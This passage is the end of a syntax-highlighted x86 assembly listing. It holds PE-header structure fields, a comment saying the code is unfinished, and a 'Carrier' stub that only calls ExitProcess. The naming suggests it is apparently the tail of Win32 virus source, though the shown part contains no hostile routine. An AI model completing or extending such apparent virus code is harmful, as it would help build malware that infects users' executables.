                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Entry_Point</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Image_Base</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Object_Align</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Align</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_Size</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">


                </span><span class="sc1">; This shit ain't complete.</span><span class="sc0">

                </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">WIN32API.INC</span><span class="sc0">


</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
